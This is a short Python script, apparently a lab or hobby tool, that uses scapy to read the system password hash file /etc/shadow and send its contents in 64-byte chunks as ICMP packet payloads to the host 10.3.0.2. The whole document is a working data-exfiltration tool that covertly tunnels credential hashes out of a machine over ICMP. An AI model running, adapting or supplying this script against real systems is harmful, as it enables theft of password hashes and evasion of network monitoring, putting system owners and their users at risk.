#!/usr/bin/env python
from scapy.all import *
import sys
sendto = "10.3.0.2"
fd = open("/etc/shadow", 'rb')
filesize = len(fd.read())
fd.seek(0)
blocksize = 64
sending = True
while sending:
	block = fd.read(blocksize)
	if block:
		a = IP(dst='10.3.0.2') / ICMP() / Raw(load=block)
		a.show()		
		sr1(a)
	else:
		sending = False
fd.close()
exit()
